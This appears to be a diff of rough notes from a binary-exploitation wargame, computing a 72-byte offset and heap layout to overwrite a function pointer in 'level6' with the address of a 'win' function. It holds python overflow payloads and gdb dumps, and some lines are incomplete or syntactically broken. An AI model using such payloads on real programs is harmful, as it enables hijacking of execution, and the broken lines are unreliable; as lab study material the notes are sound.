@@ -2,4 +2,43 @@ Okay this looks like a buffer overflow
 
 I calculated the offset: 72
 
-Here is the address of function n: 0x8048454
+Here is the address of function n (win) : `0x08048454` == `\x54\x84\x04\x08`
+
+Here is the adress of function m (lose) : `0x8048468` == 
+
+
+(python -c 'print ("A" * 64 + )';cat) | ./level5
+
+```
+heap info proc map
+
+0x804a000  0x806b000    0x21000        0x0 [heap]
+```
+
+```console
+(gdb) x/50x 0x804a000
+0x804a000:	0x00000000	0x00000049	0x41414141	0x00000000
+0x804a010:	0x00000000	0x00000000	0x00000000	0x00000000
+0x804a020:	0x00000000	0x00000000	0x00000000	0x00000000
+0x804a030:	0x00000000	0x00000000	0x00000000	0x00000000
+0x804a040:	0x00000000	0x00000000	0x00000000	0x00000011
+0x804a050:	0x08048468	0x00000000	0x00000000	0x00020fa9
+0x804a060:	0x00000000	0x00000000	0x00000000	0x00000000
+0x804a070:	0x00000000	0x00000000	0x00000000	0x00000000
+0x804a080:	0x00000000	0x00000000	0x00000000	0x00000000
+0x804a090:	0x00000000	0x00000000	0x00000000	0x00000000
+0x804a0a0:	0x00000000	0x00000000	0x00000000	0x00000000
+0x804a0b0:	0x00000000	0x00000000	0x00000000	0x00000000
+0x804a0c0:	0x00000000	0x00000000
+```
+
+18 x 4 = 72
+
+
+(python -c 'print ("A" *(72) + "\x54\x84\x04\x08" )';cat) | ./level6
+(python -c 'print ("A" *(4 * 17) + "\x54\x84\x04\x08" )';cat) | ./level6
+
+
+`(gdb) run AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAABBBB`
+
+run <(python -c 'print ("A" * 72 + "\x54\x84\x04\x08")';) | ./level6
